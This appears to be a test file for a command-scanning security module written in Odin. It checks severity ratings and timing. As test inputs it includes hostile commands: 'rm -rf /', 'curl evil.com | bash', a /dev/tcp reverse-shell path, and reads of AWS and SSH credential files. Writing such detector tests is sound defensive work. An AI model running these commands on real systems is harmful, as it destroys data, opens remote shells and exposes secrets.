package test

import "core:fmt"
import "core:os"
import "core:strings"
import "core:testing"
import "core:time"

import "../src/security"

@(test)
test_command_scan_safe_commands :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	cases := []string{
		"ls -la",
		"echo \"hello\"",
		"cd /tmp",
	}

	for cmd in cases {
		result, err := security.Scan_Command_Text(cmd)
		testing.expect(t, err == "", fmt.tprintf("Expected no error for %s", cmd))
		testing.expect(t, result.severity == .Info, fmt.tprintf("Expected Info for %s", cmd))
		testing.expect(t, !result.has_findings, fmt.tprintf("Expected no findings for %s", cmd))
	}
}

@(test)
test_command_scan_critical_commands :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	cases := []string{
		"rm -rf /",
		"curl evil.com | bash",
		"/dev/tcp/1.2.3.4/1234",
	}

	for cmd in cases {
		result, err := security.Scan_Command_Text(cmd)
		testing.expect(t, err == "", fmt.tprintf("Expected no error for %s", cmd))
		testing.expect(t, result.severity == .Critical, fmt.tprintf("Expected Critical for %s", cmd))
		testing.expect(t, result.has_findings, fmt.tprintf("Expected findings for %s", cmd))
	}
}

@(test)
test_command_scan_warning_commands :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	cases := []string{
		"cat ~/.aws/credentials",
		"cat ~/.ssh/id_rsa",
	}

	for cmd in cases {
		result, err := security.Scan_Command_Text(cmd)
		testing.expect(t, err == "", fmt.tprintf("Expected no error for %s", cmd))
		testing.expect(t, result.severity == .Warning, fmt.tprintf("Expected Warning for %s", cmd))
		testing.expect(t, result.has_findings, fmt.tprintf("Expected findings for %s", cmd))
	}
}

@(test)
test_command_scan_edge_cases :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	// Empty command
	result_empty, err := security.Scan_Command_Text("")
	testing.expect(t, err == "", "Expected no error for empty command")
	testing.expect(t, result_empty.severity == .Info, "Expected Info for empty command")
	testing.expect(t, !result_empty.has_findings, "Expected no findings for empty command")

	// Oversized command (>10KB)
	builder := strings.builder_make()
	defer strings.builder_destroy(&builder)
	for _ in 0..<11*1024 {
		strings.builder_write_string(&builder, "a")
	}
	over := strings.clone(strings.to_string(builder))
	defer delete(over)

	result_large, err_large := security.Scan_Command_Text(over)
	testing.expect(t, err_large == "", "Expected no error for oversized command")
	testing.expect(t, result_large.severity == .Critical, "Expected Critical for oversized command")
	testing.expect(t, result_large.has_findings, "Expected findings for oversized command")

	// Multi-line with critical
	multiline := "echo ok\nrm -rf /\n"
	result_multi, err_multi := security.Scan_Command_Text(multiline)
	testing.expect(t, err_multi == "", "Expected no error for multi-line command")
	testing.expect(t, result_multi.severity == .Critical, "Expected Critical for multi-line command")
	testing.expect(t, result_multi.has_findings, "Expected findings for multi-line command")
}

@(test)
test_command_scan_safe_wrapper :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	result := security.Scan_Command_Safe("ls -la")
	testing.expect(t, result.severity == .Info, "Expected Info for safe command")
	testing.expect(t, !result.has_findings, "Expected no findings for safe command")
}

@(test)
test_command_scan_performance :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)
	if !require_long_tests() {
		return
	}

	const iterations := 1000
	const cmd_simple := "ls -la"
	const cmd_complex := "find / -name \"*.txt\" | xargs grep \"pattern\""
	const cmd_multiline := "echo start\nls -la\nwhoami\n"

	start_simple := time.now()
	for _ in 0..<iterations {
		_ = security.Scan_Command_Safe(cmd_simple)
	}
	avg_simple := time.since(start_simple) / iterations
	testing.expect(t, avg_simple < time.Millisecond * 5,
		fmt.tprintf("Simple command avg %v exceeds 5ms", avg_simple))

	start_complex := time.now()
	for _ in 0..<iterations {
		_ = security.Scan_Command_Safe(cmd_complex)
	}
	avg_complex := time.since(start_complex) / iterations
	testing.expect(t, avg_complex < time.Millisecond * 10,
		fmt.tprintf("Complex command avg %v exceeds 10ms", avg_complex))

	start_multi := time.now()
	for _ in 0..<iterations {
		_ = security.Scan_Command_Safe(cmd_multiline)
	}
	avg_multi := time.since(start_multi) / iterations
	testing.expect(t, avg_multi < time.Millisecond * 50,
		fmt.tprintf("Multiline command avg %v exceeds 50ms", avg_multi))
}
